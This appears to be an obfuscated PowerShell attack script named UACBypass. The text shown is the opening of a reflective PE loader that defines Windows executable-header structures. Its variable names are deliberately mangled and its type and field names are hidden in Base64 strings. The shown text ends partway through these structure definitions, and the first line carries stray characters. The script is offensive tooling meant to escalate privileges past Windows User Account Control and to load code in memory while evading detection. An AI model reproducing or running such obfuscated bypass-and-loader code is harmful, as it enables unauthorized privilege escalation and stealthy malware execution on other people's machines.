﻿uafunction UACBypass
{
    param(
        [String]
        $command,
        [Int]
        $number
    )
function _/=\/\___/====\_/\
{
[CmdletBinding()]
Param(
    [Parameter(Position = 0, Mandatory = $true)]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
    ${__/\/\/\/\/\/\_/\_},
	[Parameter(Position = 1)]
	[String[]]
	${___/====\/==\/\/\/},
	[Parameter(Position = 2)]
    [ValidateSet( 'WString', 'String', 'Void' )]
	[String]
	${__/=\_/==\/==\/\/\} = 'Void',
	[Parameter(Position = 3)]
	[String]
	${_/=\__/\/\/=\_/\/\},
	[Parameter(Position = 4)]
	[Int32]
	${_______/\/=====\_/},
	[Parameter(Position = 5)]
	[String]
	${__/==\_/=\/==\_/\_},
    [Switch]
    ${___/==\/\/\/\_____},
	[Switch]
	${_____/\/\_/\_/==\/}
)
Set-StrictMode -Version 2
${/===\__/\_/=\____} = {
	[CmdletBinding()]
	Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		${__/\/\/\/\/\/\_/\_},
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		${__/=\_/==\/==\/\/\},
		[Parameter(Position = 2, Mandatory = $true)]
		[Int32]
		${_______/\/=====\_/},
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		${__/==\_/=\/==\_/\_},
        [Parameter(Position = 4, Mandatory = $true)]
        [Bool]
        ${___/==\/\/\/\_____}
	)
	Function __/\_/\/==\__/\_/=
	{
		$Win32Types = New-Object System.Object
		${_______/=\/==\___} = [AppDomain]::CurrentDomain
		${___/=\__/\/=\/===} = New-Object System.Reflection.AssemblyName($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAB5AG4AYQBtAGkAYwBBAHMAcwBlAG0AYgBsAHkA'))))
		${_/\___/=\__/\/\__} = ${_______/=\/==\___}.DefineDynamicAssembly(${___/=\__/\/=\/===}, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
		${__/=\__/\/\/=\___} = ${_/\___/=\__/\/\__}.DefineDynamicModule($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RAB5AG4AYQBtAGkAYwBNAG8AZAB1AGwAZQA='))), $false)
		${/=======\_/\___/\} = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
		${/=\_____/\/\/=\_/} = ${__/=\__/\/\/=\___}.DefineEnum($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGMAaABpAG4AZQBUAHkAcABlAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))), [UInt16])
		${/=\_____/\/\/=\_/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAHQAaQB2AGUA'))), [UInt16] 0) | Out-Null
		${/=\_____/\/\/=\_/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQAzADgANgA='))), [UInt16] 0x014c) | Out-Null
		${/=\_____/\/\/=\_/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQB0AGEAbgBpAHUAbQA='))), [UInt16] 0x0200) | Out-Null
		${/=\_____/\/\/=\_/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('eAA2ADQA'))), [UInt16] 0x8664) | Out-Null
		${_/=\/\____/\/\/=\} = ${/=\_____/\/\/=\_/}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value ${_/=\/\____/\/\/=\}
		${/=\_____/\/\/=\_/} = ${__/=\__/\/\/=\___}.DefineEnum($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGcAaQBjAFQAeQBwAGUA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))), [UInt16])
		${/=\_____/\/\/=\_/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATgBUAF8ATwBQAFQASQBPAE4AQQBMAF8ASABEAFIAMwAyAF8ATQBBAEcASQBDAA=='))), [UInt16] 0x10b) | Out-Null
		${/=\_____/\/\/=\_/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATgBUAF8ATwBQAFQASQBPAE4AQQBMAF8ASABEAFIANgA0AF8ATQBBAEcASQBDAA=='))), [UInt16] 0x20b) | Out-Null
		${__/=\/\/\____/===} = ${/=\_____/\/\/=\_/}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value ${__/=\/\/\____/===}
		${/=\_____/\/\/=\_/} = ${__/=\__/\/\/=\___}.DefineEnum($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB1AGIAUwB5AHMAdABlAG0AVAB5AHAAZQA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))), [UInt16])
		${/=\_____/\/\/=\_/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBVAE4ASwBOAE8AVwBOAA=='))), [UInt16] 0) | Out-Null
		${/=\_____/\/\/=\_/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBOAEEAVABJAFYARQA='))), [UInt16] 1) | Out-Null
		${/=\_____/\/\/=\_/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBXAEkATgBEAE8AVwBTAF8ARwBVAEkA'))), [UInt16] 2) | Out-Null
		${/=\_____/\/\/=\_/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBXAEkATgBEAE8AVwBTAF8AQwBVAEkA'))), [UInt16] 3) | Out-Null
		${/=\_____/\/\/=\_/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBQAE8AUwBJAFgAXwBDAFUASQA='))), [UInt16] 7) | Out-Null
		${/=\_____/\/\/=\_/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBXAEkATgBEAE8AVwBTAF8AQwBFAF8ARwBVAEkA'))), [UInt16] 9) | Out-Null
		${/=\_____/\/\/=\_/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBFAEYASQBfAEEAUABQAEwASQBDAEEAVABJAE8ATgA='))), [UInt16] 10) | Out-Null
		${/=\_____/\/\/=\_/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBFAEYASQBfAEIATwBPAFQAXwBTAEUAUgBWAEkAQwBFAF8ARABSAEkAVgBFAFIA'))), [UInt16] 11) | Out-Null
		${/=\_____/\/\/=\_/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBFAEYASQBfAFIAVQBOAFQASQBNAEUAXwBEAFIASQBWAEUAUgA='))), [UInt16] 12) | Out-Null
		${/=\_____/\/\/=\_/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBFAEYASQBfAFIATwBNAA=='))), [UInt16] 13) | Out-Null
		${/=\_____/\/\/=\_/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8AUwBVAEIAUwBZAFMAVABFAE0AXwBYAEIATwBYAA=='))), [UInt16] 14) | Out-Null
		${_/\_/\/\___/\____} = ${/=\_____/\/\/=\_/}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value ${_/\_/\/\___/\____}
		${/=\_____/\/\/=\_/} = ${__/=\__/\/\/=\___}.DefineEnum($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABsAGwAQwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMAVAB5AHAAZQA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))), [UInt16])
		${/=\_____/\/\/=\_/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFAFMAXwAwAA=='))), [UInt16] 0x0001) | Out-Null
		${/=\_____/\/\/=\_/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFAFMAXwAxAA=='))), [UInt16] 0x0002) | Out-Null
		${/=\_____/\/\/=\_/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFAFMAXwAyAA=='))), [UInt16] 0x0004) | Out-Null
		${/=\_____/\/\/=\_/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFAFMAXwAzAA=='))), [UInt16] 0x0008) | Out-Null
		${/=\_____/\/\/=\_/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAXwBDAEgAQQBSAEEAQwBUAEUAUgBJAFMAVABJAEMAUwBfAEQAWQBOAEEATQBJAEMAXwBCAEEAUwBFAA=='))), [UInt16] 0x0040) | Out-Null
		${/=\_____/\/\/=\_/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAXwBDAEgAQQBSAEEAQwBUAEUAUgBJAFMAVABJAEMAUwBfAEYATwBSAEMARQBfAEkATgBUAEUARwBSAEkAVABZAA=='))), [UInt16] 0x0080) | Out-Null
		${/=\_____/\/\/=\_/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAXwBDAEgAQQBSAEEAQwBUAEUAUgBJAFMAVABJAEMAUwBfAE4AWABfAEMATwBNAFAAQQBUAA=='))), [UInt16] 0x0100) | Out-Null
		${/=\_____/\/\/=\_/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAQwBIAEEAUgBBAEMAVABFAFIASQBTAFQASQBDAFMAXwBOAE8AXwBJAFMATwBMAEEAVABJAE8ATgA='))), [UInt16] 0x0200) | Out-Null
		${/=\_____/\/\/=\_/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAQwBIAEEAUgBBAEMAVABFAFIASQBTAFQASQBDAFMAXwBOAE8AXwBTAEUASAA='))), [UInt16] 0x0400) | Out-Null
		${/=\_____/\/\/=\_/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAQwBIAEEAUgBBAEMAVABFAFIASQBTAFQASQBDAFMAXwBOAE8AXwBCAEkATgBEAA=='))), [UInt16] 0x0800) | Out-Null
		${/=\_____/\/\/=\_/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBFAFMAXwA0AA=='))), [UInt16] 0x1000) | Out-Null
		${/=\_____/\/\/=\_/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAQwBIAEEAUgBBAEMAVABFAFIASQBTAFQASQBDAFMAXwBXAEQATQBfAEQAUgBJAFYARQBSAA=='))), [UInt16] 0x2000) | Out-Null
		${/=\_____/\/\/=\_/}.DefineLiteral($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABMAEwAQwBIAEEAUgBBAEMAVABFAFIASQBTAFQASQBDAFMAXwBUAEUAUgBNAEkATgBBAEwAXwBTAEUAUgBWAEUAUgBfAEEAVwBBAFIARQA='))), [UInt16] 0x8000) | Out-Null
		${/==\/\__/=\_/=\/\} = ${/=\_____/\/\/=\_/}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value ${/==\/\__/=\_/=\/\}
		${/\______/====\/=\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAEUAeABwAGwAaQBjAGkAdABMAGEAeQBvAHUAdAAsACAAUwBlAGEAbABlAGQALAAgAEIAZQBmAG8AcgBlAEYAaQBlAGwAZABJAG4AaQB0AA==')))
		${/=\_____/\/\/=\_/} = ${__/=\__/\/\/=\___}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARABBAFQAQQBfAEQASQBSAEUAQwBUAE8AUgBZAA=='))), ${/\______/====\/=\}, [System.ValueType], 8)
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbABBAGQAZAByAGUAcwBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(4) | Out-Null
		${__/=\_/\/=\_/\_/\} = ${/=\_____/\/\/=\_/}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value ${__/=\_/\/=\_/\_/\}
		${/\______/====\/=\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAFMAZQBxAHUAZQBuAHQAaQBhAGwATABhAHkAbwB1AHQALAAgAFMAZQBhAGwAZQBkACwAIABCAGUAZgBvAHIAZQBGAGkAZQBsAGQASQBuAGkAdAA=')))
		${/=\_____/\/\/=\_/} = ${__/=\__/\/\/=\___}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ARgBJAEwARQBfAEgARQBBAEQARQBSAA=='))), ${/\______/====\/=\}, [System.ValueType], 20)
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGMAaABpAG4AZQA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAFMAZQBjAHQAaQBvAG4AcwA='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBEAGEAdABlAFMAdABhAG0AcAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAGkAbgB0AGUAcgBUAG8AUwB5AG0AYgBvAGwAVABhAGIAbABlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAFMAeQBtAGIAbwBsAHMA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYATwBwAHQAaQBvAG4AYQBsAEgAZQBhAGQAZQByAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA')))) | Out-Null
		${_/\_/=\/==\_/\/==} = ${/=\_____/\/\/=\_/}.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value ${_/\_/=\/==\_/\/==}
		${/\______/====\/=\} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBMAGEAeQBvAHUAdAAsACAAQQBuAHMAaQBDAGwAYQBzAHMALAAgAEMAbABhAHMAcwAsACAAUAB1AGIAbABpAGMALAAgAEUAeABwAGwAaQBjAGkAdABMAGEAeQBvAHUAdAAsACAAUwBlAGEAbABlAGQALAAgAEIAZQBmAG8AcgBlAEYAaQBlAGwAZABJAG4AaQB0AA==')))
		${/=\_____/\/\/=\_/} = ${__/=\__/\/\/=\___}.DefineType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBNAEEARwBFAF8ATwBQAFQASQBPAE4AQQBMAF8ASABFAEEARABFAFIANgA0AA=='))), ${/\______/====\/=\}, [System.ValueType], 240)
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGcAaQBjAA=='))), ${__/=\/\/\____/===}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(0) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAEwAaQBuAGsAZQByAFYAZQByAHMAaQBvAG4A'))), [Byte], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(2) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAEwAaQBuAGsAZQByAFYAZQByAHMAaQBvAG4A'))), [Byte], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(3) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAQwBvAGQAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(4) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBuAGkAdABpAGEAbABpAHoAZQBkAEQAYQB0AGEA'))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(8) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAVQBuAGkAbgBpAHQAaQBhAGwAaQB6AGUAZABEAGEAdABhAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(12) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAGQAcgBlAHMAcwBPAGYARQBuAHQAcgB5AFAAbwBpAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(16) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHMAZQBPAGYAQwBvAGQAZQA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(20) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAGEAZwBlAEIAYQBzAGUA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(24) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdABpAG8AbgBBAGwAaQBnAG4AbQBlAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(32) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBBAGwAaQBnAG4AbQBlAG4AdAA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(36) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(40) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(42) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAEkAbQBhAGcAZQBWAGUAcgBzAGkAbwBuAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(44) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAEkAbQBhAGcAZQBWAGUAcgBzAGkAbwBuAA=='))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(46) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAGoAbwByAFMAdQBiAHMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(48) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBpAG4AbwByAFMAdQBiAHMAeQBzAHQAZQBtAFYAZQByAHMAaQBvAG4A'))), [UInt16], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(50) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBpAG4AMwAyAFYAZQByAHMAaQBvAG4AVgBhAGwAdQBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(52) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASQBtAGEAZwBlAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(56) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAZABlAHIAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(60) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGUAYwBrAFMAdQBtAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(64) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB1AGIAcwB5AHMAdABlAG0A'))), ${_/\_/\/\___/\____}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(68) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABsAGwAQwBoAGEAcgBhAGMAdABlAHIAaQBzAHQAaQBjAHMA'))), ${/==\/\__/=\_/=\/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(70) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAUwB0AGEAYwBrAFIAZQBzAGUAcgB2AGUA'))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(72) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYAUwB0AGEAYwBrAEMAbwBtAG0AaQB0AA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(80) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAcABSAGUAcwBlAHIAdgBlAA=='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(88) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHoAZQBPAGYASABlAGEAcABDAG8AbQBtAGkAdAA='))), [UInt64], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(96) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGEAZABlAHIARgBsAGEAZwBzAA=='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(104) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AYgBlAHIATwBmAFIAdgBhAEEAbgBkAFMAaQB6AGUAcwA='))), [UInt32], $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(108) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHAAbwByAHQAVABhAGIAbABlAA=='))), ${__/=\_/\/=\_/\_/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(112) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAHAAbwByAHQAVABhAGIAbABlAA=='))), ${__/=\_/\/=\_/\_/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(120) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAbwB1AHIAYwBlAFQAYQBiAGwAZQA='))), ${__/=\_/\/=\_/\_/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(128) | Out-Null
		(${/=\_____/\/\/=\_/}.DefineField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGMAZQBwAHQAaQBvAG4AVABhAGIAbABlAA=='))), ${__/=\_/\/=\_/\_/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAB1AGIAbABpAGMA'))))).SetOffset(136) | Out-Null
